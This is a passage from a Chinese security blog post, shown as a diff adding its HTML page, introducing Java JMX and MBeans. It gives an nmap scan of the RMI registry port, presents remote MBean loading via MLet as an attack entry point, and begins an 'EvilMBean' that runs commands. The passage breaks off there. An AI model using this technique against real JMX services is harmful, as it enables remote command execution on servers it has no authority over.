@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>JMX初识 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="JMX初识">
+  <meta itemprop="datePublished" content="2025-05-21T21:11:01+08:00">
+  <meta itemprop="dateModified" content="2025-05-21T21:11:01+08:00">
+  <meta itemprop="wordCount" content="1110">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jmx%E5%88%9D%E8%AF%86/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="JMX初识">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-05-21T21:11:01+08:00">
+    <meta property="article:modified_time" content="2025-05-21T21:11:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="JMX初识">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jmx%E5%88%9D%E8%AF%86/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E6%9C%A8%E9%A9%AC/java%E5%86%85%E5%AD%98%E9%A9%AC-listener/" /><link rel="next" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80/jdwp%E5%88%9D%E8%AF%86/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "JMX初识",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%9F%BA%E7%A1%80\/jmx%E5%88%9D%E8%AF%86\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  1110 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%9F%BA%E7%A1%80\/jmx%E5%88%9D%E8%AF%86\/","datePublished": "2025-05-21T21:11:01+08:00","dateModified": "2025-05-21T21:11:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">JMX初识</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>JMX初识</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2025-05-21 21:11:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-05-21">2025-05-21</time></span>&nbsp;<span title="1110 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1200 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>6 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#本地jmx访问">本地JMX访问</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li><a href="#远程-jmx-访问"><strong>远程 JMX 访问</strong></a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#自定义类">自定义类</a>
+      <ul>
+        <li><a href="#自定义类-1">自定义类</a></li>
+      </ul>
+    </li>
+    <li><a href="#命令执行">命令执行</a></li>
+    <li><a href="#反弹shell">反弹shell</a></li>
+    <li><a href="#认证模式">认证模式</a>
+      <ul>
+        <li><a href="#preauth">preauth</a></li>
+      </ul>
+    </li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#监控-spring-boot"><strong>监控 Spring Boot</strong></a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="基础概念" class="heading-element"><span>基础概念</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e6%a6%82%e5%bf%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>Java管理扩展（JMX）（<code>Java Management Extensions</code>）技术是Java SE的标准部分。运维人员常部署Zabbix、Cacti和Nagios对Tomcat、Weblogic等服务器进行监控时通常都是通过JMX访问Tomcat、Weblogic的方式实现，然后通过JVM的queryMBeans方法查询获取具体的Mbean(Thread、JVM、JDBC)</p>
+<p>默认情况下，JMX 通过 RMI 暴露端口（需配置安全策略)</p>
+<p>MBean 是 JMX 的核心组件，代表可管理的资源（如 JVM 内存、线程池、自定义应用指标）。</p>
+<blockquote>
+<p><strong>MBean 类型​</strong>​：</p>
+<ul>
+<li>standard MBean：这种类型的MBean最简单，它能管理的资源(包括属性，方法，时间)必须定义在接口中，然后MBean必须实现这个接口，它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean</li>
+<li>dynamic MBean：必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义</li>
+<li>open MBean：此MBean的规范还不完善，还在改进中</li>
+<li>model MBean：与标准和动态MBean相比，你可以不用写MBean类，只需使用javax.management.modelmbean.RequiredModelMBean即可，RequiredModelMBean实现了ModelMBean接口，而ModelMBean扩展了DynamicMBean接口，因此与DynamicMBean相似，Model MBean的管理资源也是在运行时定义的，与DynamicMBean不同的是，DynamicMBean管理的资源一般定义在DynamicMBean中(运行时才决定管理那些资源)，而model MBean管理的资源并不在MBean中，而是在外部(通常是一个类)，只有在运行时，才通过set方法将其加入到model MBean中，后面的例子会有详细介绍</li>
+</ul>
+</blockquote>
+<p>扫描JMX端口</p>
+<pre tabindex="0"><code>nmap -p 1099 --script rmi-dumpregistry &lt;target&gt;</code></pre><p>常见的 JMX 服务端口包括：</p>
+<table>
+<thead>
+<tr>
+<th>默认端口</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>1099</code></td>
+<td>RMI Registry，JMX 常通过 RMI 使用</td>
+</tr>
+<tr>
+<td><code>1098</code></td>
+<td>JBoss 默认 JNP（命名服务）端口</td>
+</tr>
+<tr>
+<td><code>4447</code></td>
+<td>JBoss Remoting</td>
+</tr>
+<tr>
+<td><code>9010</code></td>
+<td>JMX Remote Debugging</td>
+</tr>
+<tr>
+<td><code>8686</code></td>
+<td>GlassFish 默认 JMX 端口</td>
+</tr>
+<tr>
+<td><code>9999</code></td>
+<td>通用 JMX 服务（也常用于 JBoss、WebLogic）</td>
+</tr>
+</tbody>
+</table>
+<h1 id="本地mbean" class="heading-element"><span>本地Mbean</span>
+  <a href="#%e6%9c%ac%e5%9c%b0mbean" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>文件结构：</p>
+<pre tabindex="0"><code>├── HelloWorld.java
+├── HelloWorldMBean.java
+└── jmxDemo.java</code></pre><p>代码实现：
+HelloWorldMBean.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.jmx</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">HelloWorldMBean</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">sayhello</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">add</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">x</span>, <span style="color:#ff636f">int</span> <span style="color:#58a1dd">y</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">getName</span>();
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>HelloWorld.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.jmx</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">HelloWorld</span> <span style="color:#ff636f">implements</span> <span style="color:#58a1dd">HelloWorldMBean</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">private</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#34;Al1ex&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">sayhello</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;hello world &#34;</span> <span style="color:#ff636f">+</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">int</span> <span style="color:#58a1dd">add</span>(<span style="color:#ff636f">int</span> <span style="color:#58a1dd">x</span>, <span style="color:#ff636f">int</span> <span style="color:#58a1dd">y</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">x</span> <span style="color:#ff636f">+</span> <span style="color:#58a1dd">y</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">@Override</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">getName</span>() {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">name</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>jmxDemo.java</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.jmx</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.lang.management.ManagementFactory</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.MBeanServer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.ObjectName</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.registry.LocateRegistry</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.rmi.registry.Registry</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXServiceURL</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnectorServer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.management.remote.JMXConnectorServerFactory</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">jmxDemo</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">MBeanServer</span> <span style="color:#58a1dd">mbs</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ManagementFactory</span>.<span style="color:#58a1dd">getPlatformMBeanServer</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectName</span> <span style="color:#58a1dd">mbsname</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectName</span>(<span style="color:#a6be9d">&#34;test:type=HelloWorld&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">HelloWorld</span> <span style="color:#58a1dd">mbean</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">HelloWorld</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">mbs</span>.<span style="color:#58a1dd">registerMBean</span>(<span style="color:#58a1dd">mbean</span>, <span style="color:#58a1dd">mbsname</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Registry</span> <span style="color:#58a1dd">registry</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">LocateRegistry</span>.<span style="color:#58a1dd">createRegistry</span>(<span style="color:#58a1dd">1099</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">JMXServiceURL</span> <span style="color:#58a1dd">jmxServiceURL</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">JMXServiceURL</span>(<span style="color:#a6be9d">&#34;service:jmx:rmi:///jndi/rmi://localhost:1099/jmxrmi&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">JMXConnectorServer</span> <span style="color:#58a1dd">jmxConnectorServer</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">JMXConnectorServerFactory</span>.<span style="color:#58a1dd">newJMXConnectorServer</span>(<span style="color:#58a1dd">jmxServiceURL</span>, <span style="color:#ff636f">null</span>, <span style="color:#58a1dd">mbs</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">jmxConnectorServer</span>.<span style="color:#58a1dd">start</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;JMXConnectorServer is ready...&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#a6be9d">&#34;press any key to exit.&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">in</span>.<span style="color:#58a1dd">read</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h3 id="本地jmx访问" class="heading-element"><span>本地JMX访问</span>
+  <a href="#%e6%9c%ac%e5%9c%b0jmx%e8%ae%bf%e9%97%ae" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>一、<strong>java代码</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">MBeanServer</span> <span style="color:#58a1dd">mbs</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ManagementFactory</span>.<span style="color:#58a1dd">getPlatformMBeanServer</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">ObjectName</span> <span style="color:#58a1dd">name</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectName</span>(<span style="color:#a6be9d">&#34;com.example:type=Hello&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">mbs</span>.<span style="color:#58a1dd">invoke</span>(<span style="color:#58a1dd">name</span>, <span style="color:#a6be9d">&#34;sayHello&#34;</span>, <span style="color:#ff636f">null</span>, <span style="color:#ff636f">null</span>); <span style="color:#ff636f">//</span> <span style="color:#58a1dd">调用方法</span></span></span></code></pre></div><p>二、<strong>JConsole</strong>（图形化工具）：</p>
+<ol>
+<li>运行程序后，启动 <code>jconsole</code>（JDK 自带工具）。</li>
+<li>连接到本地进程，找到 <code>com.example</code> → <code>Hello</code> MBean。</li>
+</ol>
+<h1 id="远程mbean" class="heading-element"><span>远程Mbean</span>
+  <a href="#%e8%bf%9c%e7%a8%8bmbean" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>JMX通过<code>MLet</code>对象可以加载远程MBean（<code>MLet.getMBeansFromURL</code>方法）</p>
+<p><code>MLet.getMBeansFromURL</code> + 远程MBean加载 = 漏洞入口</p>
+<p>Step 1：编写一个EvilMBean接口</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">interface</span> <span style="color:#58a1dd">EvilMBean</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">runCommand</span>(<span style="color:#58a1dd">String</span> <span style="color:#58a1dd">cmd</span>);
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>Step 2：编写EvilMBean的实现</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.*</span>;
+</span></span><span style="display:flex;"><span>
